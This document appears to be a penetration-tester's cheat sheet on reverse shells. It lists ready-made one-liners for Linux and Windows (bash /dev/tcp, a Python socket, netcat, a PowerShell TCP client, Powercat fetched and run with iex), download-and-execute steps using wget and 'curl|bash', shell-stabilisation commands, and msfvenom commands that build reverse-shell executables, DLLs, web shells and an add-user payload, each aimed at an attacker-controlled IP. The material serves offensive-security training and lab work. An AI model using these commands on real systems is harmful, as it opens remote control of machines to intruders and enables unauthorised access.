## [Reverse shells](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)

**_!!! Try OPEN ports: 80, 443, 8080, 9001, ... !!!_**

### Linux

```bash
# Bash
bash -c "bash -i >& /dev/tcp/<IP>/443 0>&1"

# Python
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

# NC OpenBsd
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <IP> 443 >/tmp/f

# Busybox
busybox nc <IP> 443 -e /bin/sh
```
>[!info]
>Try full path: e.g. /bin/bash
>revshells.com to generate payloads!

```shell
# Create file
cat rev.sh
bash -c "bash -i >& /dev/tcp/<IP>/443 0>&1"

# Start python webserver
python3 -m http.server 80

# RCE commands:
wget <IP>/rev.sh -O /tmp/rev.sh
bash /tmp/rev.sh
-- OR --
curl http://<IP>/rev.sh|bash
```

### Windows

```powershell
# Powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# nc.exe
nc.exe -e cmd.exe <IP> 443

# Powercat
powershell -exec bypass -c "iwr('http://<IP>/powercat.ps1')|iex;powercat -c <IP> -p 443 -e cmd"

# Powercat alternative
IEX (New-Object System.Net.Webclient).DownloadString("http://<IP>/powercat.ps1");powercat -c <IP> -p 443 -e powershell
```
>[!info]
>Fix escaping issues: `\` becomes `\\`
>Try `/` and `\`
>revshells.com to generate payloads

```bash
# Fix PATH variable:
set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;
```


---

## Stabilize shells

### Linux
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'

Ctrl-Z

stty raw -echo; fg

reset
export SHELL=bash
export TERM=xterm-256color
stty rows 35 columns 150
```

### Windows

Powercat: [link](https://github.com/besimorhino/powercat)
```shell
powershell -exec bypass -c "iwr('http://<IP>/powercat.ps1')|iex;powercat -c <IP> -p 443 -e cmd"
```


---

## msfvenom

aspx:
```bash
msfvenom -f aspx -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -o shell.aspx
```

Windows:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -f exe -o shell.exe
```

PHP for windows:
```bash
msfvenom -p php/reverse_php LHOST=<IP> LPORT=443 -f raw -o rev.pHp
```

DLL:
```bash
msfvenom -p windows/x64/shell_reverse_tcp lhost=<IP> lport=443 -f dll > shell.dll
```

Add user in windows:
```bash
msfvenom -p windows/adduser USER=<user> PASS=<pass> -f exe -o user.exe 
```
